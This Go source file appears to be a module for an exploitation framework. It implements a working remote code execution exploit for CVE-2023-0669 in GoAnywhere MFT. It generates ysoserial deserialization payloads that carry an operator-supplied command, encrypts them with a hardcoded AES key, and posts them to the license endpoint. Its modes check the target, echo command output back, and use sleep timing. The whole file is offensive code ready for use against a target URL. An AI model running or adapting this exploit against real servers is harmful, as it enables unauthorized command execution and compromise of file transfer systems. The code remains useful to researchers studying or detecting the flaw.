package exp_GoAnywhere

import (
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/code_invoke"
	"github.com/lz520520/railgunlib/pkg/templates/code_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
	"time"
)

type Exp_CVE_2023_0669 struct {
	exp_templates.ExpTemplate
}

// #####################编码转换模块生成#########################
func AESEncode(src string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType: "crypto",
			CodeName: "AES",
			CodeMode: "Encode",
			CodeOptions: []code_model.CodeOption{

				{
					KeyName: "attach_iv",
					Value:   "no",
				},

				{
					KeyName: "padding",
					Value:   "PKCS5Padding",
				},

				{
					KeyName: "mode",
					Value:   "CBC",
				},

				{
					KeyName: "IV",
					Value:   "QUVTL0NCQy9QS0NTNVBhZA==",
					Coding:  code_model.CODING_Base64,
				},

				{
					KeyName: "key",
					Value:   "Z4tYML+Lii4EdLl9bNGOhF+8SxH8oNavLbHrEUwp/Es=",
					Coding:  code_model.CODING_Base64,
				},
			},
			OutputCoding: code_model.CODING_Base64,
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################
func (self *Exp_CVE_2023_0669) Attack_check() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	payload, _ := AESEncode(string(gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd)))
	payload = strings.ReplaceAll(payload, "+", "-")
	payload = strings.ReplaceAll(payload, "/", "_")
	params := "bundle=payload"
	params = strings.Replace(params, "payload", payload, 1)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/goanywhere/lic/accept"), params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Status = true
	self.EchoInfoMsg("无回显，自行检查")
	return
}

func (self *Exp_CVE_2023_0669) Attack_echocmd() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	headers := self.GetInitExpHeaders()
	payload, _ := AESEncode(string(gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd)))
	payload = strings.ReplaceAll(payload, "+", "-")
	payload = strings.ReplaceAll(payload, "/", "_")
	params := "bundle=payload"
	params = strings.Replace(params, "payload", payload, 1)
	// cmd插入头部
	self.AddEncodeCmdHeader(headers, cmd)

	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/goanywhere/lic/accept"), params, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))

	if self.CheckRespHeader(httpresp.Resp.Header) {
		expResult.Status = true
		// 解码响应数据
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		self.EchoInfoMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

func (self *Exp_CVE_2023_0669) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	payload, _ := AESEncode(string(gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), "")))
	params := "bundle=payload"
	payload = strings.ReplaceAll(payload, "+", "-")
	payload = strings.ReplaceAll(payload, "/", "_")
	params = strings.Replace(params, "payload", payload, 1)

	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/goanywhere/lic/accept"), params, headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_CVE_2023_0669) Attack_sleep() (expResult exp_model.ExpResult) {
	expResult.Status, _ = self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2023_0669{}, "exp_CVE_2023_0669.yml")

}
